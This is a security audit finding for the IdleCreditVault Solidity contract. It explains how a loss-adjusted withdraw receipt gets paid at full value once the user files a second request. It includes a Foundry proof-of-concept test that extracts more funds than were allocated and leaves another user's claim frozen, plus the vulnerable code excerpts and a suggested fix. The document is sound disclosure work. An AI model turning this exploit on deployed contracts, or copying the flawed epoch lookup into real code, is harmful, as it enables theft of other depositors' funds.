### Title
Loss-adjusted withdraw receipts are re-paid at par after a later request, draining funds reserved for other claimants - (File: contracts/strategies/idle/IdleCreditVault.sol)

### Summary
The external report describes a claim path that reverts when the pool lacks underlying, forcing underfunding onto the last claimant. The idle-tranches analog lives in `IdleCreditVault`: when `stopEpochWithDuration` partially funds pending receipts, `collectWithdrawFunds` records a haircut in `lossRecoveryPriceByEpoch[epochNumber]`, but `_claimLossAdjustedWithdrawRequest` looks up the price by `lastWithdrawRequest[_user]` — the user's *latest* request epoch. If the user submits a new `requestWithdraw` in a later (fully funded) epoch, the loss-adjusted lookup returns 0, `_claimFundedWithdrawRequest` then pays the *entire* `withdrawsRequests[_user]` aggregate — including the haircutted epoch-N basis — at par. The attacker withdraws more underlying than was ever funded for their receipts, leaving the strategy underfunded so that other users' `claimWithdrawRequest`/`claimInstantWithdrawRequest` revert permanently on `safeTransfer`.

### Finding Description
- `requestWithdraw` adds the request to `withdrawsRequests[_user]` and sets `lastWithdrawRequest[_user] = currentEpoch` [1](#0-0) .
- On a partial stop, `collectWithdrawFunds` stores `lossRecoveryPriceByEpoch[epochNumber] = _amount * RECOVERY_FULL / pendingBasis`, zeroes `pendingWithdraws`, and pulls only `_amount` underlying into the strategy [2](#0-1) .
- The loss-adjusted claim uses `lastWithdrawRequest[_user]` as the lookup epoch: `lossRecoveryPriceByEpoch[lastWithdrawRequest[_user]]` [3](#0-2) . Once the user files a second request in epoch N+1, `lastWithdrawRequest` is N+1, `lossRecoveryPriceByEpoch[N+1] == 0`, and the function returns 0 without clearing the epoch-N receipt.
- `claimWithdrawRequest` then falls through to `_claimFundedWithdrawRequest`, which computes `amount = withdrawsRequests[_user]` (full aggregate, both epochs), burns only the receipt tokens, and calls `_transferFundedClaim(_user, amount)` [4](#0-3) . `_transferFundedClaim` only guards the `defaultRecoveryReserve`; there is no per-epoch funding check [5](#0-4) .
- The strategy was funded `price_N * basis_N + basis_{N+1}` but pays out `basis_N + basis_{N+1}`. The shortfall `(1 - price_N) * basis_N` is taken from underlying funded for *other* users' receipts; their subsequent `claimWithdrawRequest` calls revert in `safeTransfer` (or `_transferFundedClaim`'s reserve check), permanently freezing their claims.

Broken invariant: "one receipt, one funded payout" — a haircutted receipt is settled at par, converting a realized loss into theft of other claimants' funded withdrawals.

### Impact Explanation
An unprivileged tranche holder who had a receipt in the loss epoch and makes a small second request in the next epoch claims `(1 - lossRecoveryPrice) * basis` more than was funded. The loss is borne by the last funded claimants, whose claims revert indefinitely — direct theft plus permanent freezing of unclaimed withdrawals, exactly mirroring the reported "insufficient liquidity → revert → bad debt" pattern.

### Likelihood Explanation
Requires only that the manager executes a partial `stopEpoch`/`stopEpochWithDuration` (an honest, expected response to borrower underpayment — explicitly designed via `previewLossAdjustedWithdrawFunds`) and that the user files any second withdraw request afterward, which requires no privilege and is a natural action. No KYC bypass or privileged misbehavior is needed.

### Recommendation
Resolve per-epoch loss claims independently of `lastWithdrawRequest`. Iterate or store the pending loss epoch(s) per user (e.g., a `lossEpochs[_user]` list or a `lossClaimEpoch[_user]` set at request time when `pendingWithdraws` is being haircut), so `_claimLossAdjustedWithdrawRequest` clears the haircutted receipt at `lossRecoveryPrice` even when newer funded receipts exist. Alternatively, when a new `requestWithdraw` is made, immediately settle any outstanding loss-adjusted receipt at its stored price rather than letting it roll into the par-valued aggregate `withdrawsRequests[_user]`.

```solidity
function testLossReceiptPaidAtParAfterSecondRequest() external {
    _setFeeParams(TL_MULTISIG, 0, FULL_ALLOC, cdoEpoch.managementFee());
    uint256 amount = 10_000 * ONE_SCALE;
    idleCDO.depositAA(amount);          // attacker (this contract)
    _depositWithUser(makeAddr("victim"), amount, true);

    // Epoch 0: attacker requests full withdraw
    cdoEpoch.requestWithdraw(0, address(AAtranche));        // basis_N = ~10k
    _startEpochAndCheckPrices(0);

    // stopEpochWithDuration with a loss: borrower funds only 50% of pendingWithdraws
    vm.warp(cdoEpoch.epochEndDate() + 1);
    uint256 pending = IdleCreditVault(address(strategy)).pendingWithdraws();
    deal(defaultUnderlying, borrower, pending / 2 + 1);
    vm.prank(manager);
    cdoEpoch.stopEpochWithDuration(0, 0, pending / 2);      // lossRecoveryPriceByEpoch[N] = 0.5e18

    // Epoch N+1: attacker makes a tiny new request -> lastWithdrawRequest = N+1
    _startEpochAndCheckPrices(1);
    // (victim deposits or attacker re-deposits a small amount first if needed)
    cdoEpoch.requestWithdraw(1e6, address(AAtranche));
    _startEpochAndCheckPrices(2);                            // fully funded stop
    vm.warp(cdoEpoch.epochEndDate() + 1);
    deal(defaultUnderlying, borrower, 1_000_000 * ONE_SCALE);
    vm.prank(manager);
    cdoEpoch.stopEpoch(0, 0);

    // Attacker claims: loss-adjusted lookup hits epoch N+1 (price 0) -> skipped,
    // _claimFundedWithdrawRequest pays withdrawsRequests (incl. epoch-N basis) at par.
    uint256 balPre = IERC20Detailed(defaultUnderlying).balanceOf(address(this));
    cdoEpoch.claimWithdrawRequest();
    uint256 paid = IERC20Detailed(defaultUnderlying).balanceOf(address(this)) - balPre;
    assertGt(paid, pending / 2, "loss receipt paid at par instead of haircut");

    // Victim's funded claim now reverts: strategy balance is insufficient.
    vm.prank(makeAddr("victim"));
    vm.expectRevert();
    cdoEpoch.claimWithdrawRequest();
}
```

```text
  function collectWithdrawFunds(uint256 _amount) external {
    _onlyIdleCDO();
    uint256 pendingBasis = pendingWithdraws;
    if (_amount < pendingBasis) {
      // Legacy receipts do not have per-epoch ownership data, so they can only be fully funded.
      if (!defaultRecoveryInitialized) revert NotAllowed();
      uint256 lossRecoveryPrice = _amount * RECOVERY_FULL / pendingBasis;
      // Avoid storing a zero price, which is indistinguishable from "no loss-adjusted epoch".
      if (lossRecoveryPrice == 0) revert NotAllowed();
      pendingWithdraws = 0;
      lossRecoveryPriceByEpoch[epochNumber] = lossRecoveryPrice;
    } else {
      // A plain implementation upgrade may leave legacy normal receipts pending. Their next
      // successful stop can fully fund the aggregate before lazy initialization occurs.
      pendingWithdraws = pendingBasis - _amount;
```

```text
  function _claimLossAdjustedWithdrawRequest(address _user) internal returns (uint256 amount) {
    uint256 lossEpoch = lastWithdrawRequest[_user];
    uint256 lossRecoveryPrice = lossRecoveryPriceByEpoch[lossEpoch];
    if (lossRecoveryPrice == 0) return amount;

    (uint256 claimBasis, uint256 burnAmount) = _clearWithdrawClaimForEpoch(_user, lossEpoch, false);
    if (claimBasis == 0) return amount;

    // pendingWithdraws was already cleared when the borrower funded the loss-adjusted amount.
    _burn(_user, burnAmount);
    amount = (claimBasis * lossRecoveryPrice) / RECOVERY_FULL;
    _transferFundedClaim(_user, amount);
```

```text
  function _transferFundedClaim(address _user, uint256 _amount) internal {
    if (_amount == 0) return;
    uint256 reserve = defaultRecoveryReserve;
    if (reserve != 0) {
      uint256 balance = underlyingToken.balanceOf(address(this));
      // This should be unreachable when accounting is consistent. Keep the guard so old funded
      // receipts can never spend underlyings reserved for default recovery claimants.
      if (balance < reserve || balance - reserve < _amount) revert NotAllowed();
    }
    underlyingToken.safeTransfer(_user, _amount);
  }
```
